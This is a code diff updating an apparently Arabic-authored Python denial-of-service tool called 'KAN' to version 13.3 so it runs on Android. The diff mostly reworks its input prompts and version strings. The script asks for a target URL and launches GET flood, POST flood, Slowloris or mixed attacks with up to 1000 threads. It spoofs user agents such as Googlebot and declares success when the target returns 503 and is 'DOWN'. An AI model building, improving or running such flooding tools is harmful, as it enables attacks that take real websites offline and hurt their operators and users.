@@ -2,9 +2,10 @@
 # -*- coding: utf-8 -*-
 # ═══════════════════════════════════════════════════════════════════════════════
 #  KAN - Kanaan Advanced Network Termination Engine
-#  Version: 13.0 CLEAR | Mode: UESM ALPHA_ENGINEER
+#  Version: 13.3 ANDROID | Mode: UESM ALPHA_ENGINEER
 #  Engineered by: Mo.dark Engineering v7.0
 #  Owner: KANAAN (كنعان)
+#  PATCH: Complete removal of f-strings from input() for Android compatibility
 # ═══════════════════════════════════════════════════════════════════════════════
 
 import urllib.request
@@ -37,7 +38,7 @@ class C:
     RS = '\033[0m'
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# SECTION 2: KAN BANNERS - ENGLISH LETTERS ONLY, NO SPECIAL CHARS
+# SECTION 2: KAN BANNERS
 # ═══════════════════════════════════════════════════════════════════════════════
 
 KAN_MAIN = """
@@ -52,7 +53,7 @@ KAN_MAIN = """
 |     K    K  A           A  N     NN              |
 |                                                  |
 |          KANAAN NETWORK ENGINE                   |
-|               v13.0 CLEAR                        |
+|               v13.3 ANDROID                      |
 |                                                  |
 +--------------------------------------------------+
 """
@@ -236,7 +237,7 @@ class Banner:
         
         # Animated subtitle
         Anim.pulse("KANAAN ADVANCED NETWORK TERMINATION", C.Y, 2)
-        Anim.orbit("ENGINE v13.0 CLEAR", C.C)
+        Anim.orbit("ENGINE v13.3 ANDROID", C.C)
         
         print(f"{C.M}{C.BD}{'*'*60}{C.RS}")
         Anim.zzz(300)
@@ -309,7 +310,7 @@ class Engine:
             'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
             'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-            'KAN-Terminator/13.0 (Kanaan Strike Bot)',
+            'KAN-Terminator/13.3 (Kanaan Strike Bot)',
         ]
     
     def rip(self):
@@ -367,7 +368,7 @@ class Engine:
         while self.run:
             c += 1
             try:
-                req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Monitor/13.0'}, method='HEAD')
+                req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Monitor/13.3'}, method='HEAD')
                 resp = urllib.request.urlopen(req, timeout=8, context=self.ssl)
                 
                 with self.lock:
@@ -407,10 +408,10 @@ class Engine:
 +----------------------------------------------------------+
 |  {C.C}Target:{C.W} {self.target[:40]:<40}|
 |  {C.C}Status:{C.W} {status:<40}|
-|  {C.C}Time:{C.W}   {e:.1f}s{' ':<37}|
+|  {C.C}Time:{C.W}   {e:.1f}s{' '*37}|
 +----------------------------------------------------------+
 |  {C.G}Success:{C.W} {self.ok:<8} {C.Y}Failed:{C.W} {self.bad:<8} {C.C}Total:{C.W} {self.all:<8}|
-|  {C.M}RPS:{C.W}     {rps:.1f}{' ':<42}|
+|  {C.M}RPS:{C.W}     {rps:.1f}{' '*42}|
 +----------------------------------------------------------+{C.RS}"""
             
             print('\033[H\033[J', end='')
@@ -426,7 +427,7 @@ class Engine:
         Anim.spin("KAN scanning target...", 1200, C.C)
         
         try:
-            req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Probe/13.0'}, method='HEAD')
+            req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Probe/13.3'}, method='HEAD')
             resp = urllib.request.urlopen(req, timeout=10, context=self.ssl)
             
             ip = socket.gethostbyname(self.domain)
@@ -497,10 +498,10 @@ class Engine:
 |                  STRIKE TERMINATION REPORT                |
 +----------------------------------------------------------+
 |  Target:      {self.target[:44]:<44}|
-|  Result:      {C.R}{C.BL}SERVICE UNAVAILABLE (503){C.G}{' ':<21}|
-|  Duration:    {e:.1f} seconds{' ':<34}|
+|  Result:      {C.R}{C.BL}SERVICE UNAVAILABLE (503){C.G}{' '*21}|
+|  Duration:    {e:.1f} seconds{' '*34}|
 |  Total Hits:  {self.all:<10} | Success: {self.ok:<10}      |
-|  Status:      {C.R}{C.BL}TARGET DOWN [OK]{C.G}{' ':<29}|
+|  Status:      {C.R}{C.BL}TARGET DOWN [OK]{C.G}{' '*29}|
 +----------------------------------------------------------+
 {C.RS}
 
@@ -540,80 +541,121 @@ class Engine:
         print("|                     KAN STRIKE HALTED                     |")
         print("+----------------------------------------------------------+")
         print(f"|  Target:      {self.target:<44}|")
-        print(f"|  Duration:    {e:.1f}s{' ':<43}|")
-        print(f"|  Total Hits:  {self.all:<10} | Target Down: {'YES' if self.down else 'NO'}{' ':<14}|")
+        print(f"|  Duration:    {e:.1f}s{' '*43}|")
+        print(f"|  Total Hits:  {self.all:<10} | Target Down: {'YES' if self.down else 'NO'}{' '*14}|")
         print("+----------------------------------------------------------+")
         print(f"{C.RS}")
-        print(f"{C.C}{C.BD}  KAN v13.0 - Kanaan Engineering - UESM Protocol{C.RS}")
+        print(f"{C.C}{C.BD}  KAN v13.3 - Kanaan Engineering - UESM Protocol{C.RS}")
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# SECTION 6: MAIN INTERFACE
+# SECTION 6: MAIN INTERFACE - ANDROID COMPATIBILITY FIX v13.3
+# ═══════════════════════════════════════════════════════════════════════════════
+# ملاحظة: تم إزالة ALL f-strings من داخل input() لأن بيئة IIEC/Pydroid
+# تتعامل معها بشكل غير متوقع على Android
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def main():
     Banner.main()
     
     Anim.type("  [SPIDER] Welcome to KAN Command & Control Center", C.C, 10)
-    Anim.type("  [SAT] Kanaan Advanced Network Termination Engine v13.0", C.C, 10)
+    Anim.type("  [SAT] Kanaan Advanced Network Termination Engine v13.3", C.C, 10)
     Anim.type("  [BOLT] Protocol: O_ENGINEERING_PRIME | Mode: UESM ALPHA", C.C, 10)
     Anim.type("  [FIRE] This tool will flood the target until it returns 503", C.Y, 10)
     
     print(f"{C.M}{C.BD}{'*'*60}{C.RS}")
     print()
     
-    target = input(f"{C.G}{C.BD}  [TARGET] Enter target URL: {C.RS}").strip()
+    # ═══════════════════════════════════════════════════════════════════════
+    # FIX 1: فصل print() عن input() - لا f-string داخل input()
+    # ═══════════════════════════════════════════════════════════════════════
+    print(C.G + C.BD + "  [TARGET] Enter target URL: " + C.RS, end='')
+    target = input().strip()
     
     if not target:
-        print(f"{C.R}  [X] No target provided. Exiting.{C.RS}")
+        print(C.R + "  [X] No target provided. Exiting." + C.RS)
         return
     
     if not target.startswith(('http://', 'https://')):
         target = 'https://' + target
     
-    print(f"\n{C.Y}{C.BD}  [LOCK] Target locked: {target}{C.RS}\n")
+    print(C.Y + C.BD + "  [LOCK] Target locked: " + target + C.RS)
+    print()
     
     eng = Engine(target)
     eng.check()
     
-    print(f"\n{C.C}{C.BD}  [GEAR] Select Strike Mode:{C.RS}")
-    print(f"  {C.G}[1] GET Flood{C.RS}")
-    print(f"  {C.Y}[2] POST Flood{C.RS}")
-    print(f"  {C.M}[3] Slowloris{C.RS}")
-    print(f"  {C.R}[4] Mixed Mode (RECOMMENDED){C.RS}")
+    # ═══════════════════════════════════════════════════════════════════════
+    # FIX 2: اختيار الوضع - فصل print عن input
+    # ═══════════════════════════════════════════════════════════════════════
+    print()
+    print(C.C + C.BD + "  [GEAR] Select Strike Mode:" + C.RS)
+    print(C.G + "  [1] GET Flood" + C.RS)
+    print(C.Y + "  [2] POST Flood" + C.RS)
+    print(C.M + "  [3] Slowloris" + C.RS)
+    print(C.R + "  [4] Mixed Mode (RECOMMENDED)" + C.RS)
+    print()
+    print(C.W + C.BD + "  [->] Select (1-4): " + C.RS, end='')
     
-    mode = input(f"\n{C.W}{C.BD}  [->] Select (1-4): {C.RS}").strip()
+    mode_input = input().strip()
+    mode = mode_input if mode_input else "4"
+    print(C.K + "  [INFO] Mode selected: " + mode + C.RS)
     
-    print(f"\n{C.C}{C.BD}  [GEAR] Select Intensity:{C.RS}")
-    print(f"  {C.G}[1] Light    - 50 threads{C.RS}")
-    print(f"  {C.Y}[2] Medium   - 100 threads{C.RS}")
-    print(f"  {C.R}[3] Heavy    - 200 threads{C.RS}")
-    print(f"  {C.M}[4] Maximum  - 500 threads{C.RS}")
-    print(f"  {C.R}{C.BL}[5] KAN      - 1000 threads{C.RS}")
+    # ═══════════════════════════════════════════════════════════════════════
+    # FIX 3: اختيار الخيوط - فصل print عن input + معالجة نصية 100%
+    # ═══════════════════════════════════════════════════════════════════════
+    print()
+    print(C.C + C.BD + "  [GEAR] Select Intensity:" + C.RS)
+    print(C.G + "  [1] Light    - 50 threads" + C.RS)
+    print(C.Y + "  [2] Medium   - 100 threads" + C.RS)
+    print(C.R + "  [3] Heavy    - 200 threads" + C.RS)
+    print(C.M + "  [4] Maximum  - 500 threads" + C.RS)
+    print(C.R + C.BL + "  [5] KAN      - 1000 threads" + C.RS)
+    print()
+    print(C.W + C.BD + "  [->] Select (1-5): " + C.RS, end='')
     
-    intensity = input(f"\n{C.W}{C.BD}  [->] Select (1-5): {C.RS}").strip()
+    intensity_input = input().strip()
     
-    threads = {'1': 50, '2': 100, '3': 200, '4': 500, '5': 1000}.get(intensity, 100)
+    # معالجة نصية 100% بدون أي تحويل رقمي
+    thread_settings = {
+        "1": 50,
+        "2": 100,
+        "3": 200,
+        "4": 500,
+        "5": 1000,
+    }
     
+    if intensity_input in thread_settings:
+        threads = thread_settings[intensity_input]
+    else:
+        threads = 100
+        print(C.Y + "  [!] Invalid selection '" + intensity_input + "', defaulting to 100 threads" + C.RS)
+    
+    # ═══════════════════════════════════════════════════════════════════════
+    # FIX 4: تأكيد الهجوم - فصل print عن input
+    # ═══════════════════════════════════════════════════════════════════════
     Anim.clr()
-    print(f"{C.R}{C.BD}{KAN_MAIN}{C.RS}")
+    print(C.R + C.BD + KAN_MAIN + C.RS)
     
-    print(f"\n{C.R}{C.BD}")
-    print("    +--------------------------------------------------+")
-    print("    |           *** FINAL STRIKE CONFIRMATION ***      |")
-    print("    +--------------------------------------------------+")
-    print(f"    |  Target:  {target[:40]:<40}|")
-    print(f"    |  Threads: {threads:<40}|")
-    print(f"    |  Goal:    TARGET DOWN (503 Error){' '<19}|")
-    print("    +--------------------------------------------------+")
-    print(f"{C.RS}")
+    print()
+    print(C.R + C.BD + "    +--------------------------------------------------+" + C.RS)
+    print(C.R + C.BD + "    |           *** FINAL STRIKE CONFIRMATION ***      |" + C.RS)
+    print(C.R + C.BD + "    +--------------------------------------------------+" + C.RS)
+    print(C.R + C.BD + "    |  Target:  " + target[:40].ljust(40) + "|" + C.RS)
+    print(C.R + C.BD + "    |  Threads: " + str(threads).ljust(40) + "|" + C.RS)
+    print(C.R + C.BD + "    |  Goal:    TARGET DOWN (503 Error)" + " ".ljust(19) + "|" + C.RS)
+    print(C.R + C.BD + "    +--------------------------------------------------+" + C.RS)
+    print()
+    print(C.R + C.BD + "  [SKULL] Confirm strike? (yes/no): " + C.RS, end='')
     
-    confirm = input(f"{C.R}{C.BD}  [SKULL] Confirm strike? (yes/no): {C.RS}").strip().lower()
+    confirm = input().strip().lower()
     
-    if confirm in ['yes', 'y', '1']:
+    # مقارنة نصية صريحة بدون أي تعقيد
+    if confirm == "yes" or confirm == "y" or confirm == "1":
         Anim.scan(C.G)
         eng.launch(threads)
     else:
-        print(f"\n{C.Y}  [STOP] Strike cancelled.{C.RS}")
+        print()
+        print(C.Y + "  [STOP] Strike cancelled." + C.RS)
 
 if __name__ == "__main__":
     main()
